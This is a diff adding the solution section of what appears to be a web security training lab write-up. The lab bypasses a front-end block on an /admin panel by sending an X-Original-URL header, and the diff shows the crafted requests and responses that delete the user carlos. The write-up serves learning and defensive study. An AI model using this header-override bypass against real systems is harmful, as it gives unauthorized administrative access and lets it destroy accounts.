@@ -392,3 +392,52 @@ To solve the lab, access the admin panel and delete the user `carlos`.
 
 ## Solution
 
+Heading to the `/admin` panel returns:
+
+```
+HTTP/2 403 Forbidden
+[...]
+"Access denied"
+```
+
+As the description suggests, the block is just a frontend blockage. As the backend supports the header `X-Original-URL`, heading to `/`, sending the request to repeater and adding the header `X-Original-URL` to the request with value `/admin` returns the admin panel:
+
+```
+HTTP/2 200 OK
+[...]
+<a href="/admin/delete?username=carlos">Delete</a>
+[...]
+```
+
+containing the delete link for user `carlos`. Changing the header to:
+
+```
+GET / HTTP/2
+[...]
+X-Original-Url: /admin/delete?username=carlos
+[...]
+```
+
+returns:
+
+```
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 30
+
+"Missing parameter 'username'"
+```
+
+adjusting the request to:
+
+```
+GET /?username=carlos HTTP/2
+[...]
+X-Original-Url: /admin/delete
+[...]
+```
+
+and sending it solves the lab.
+
+
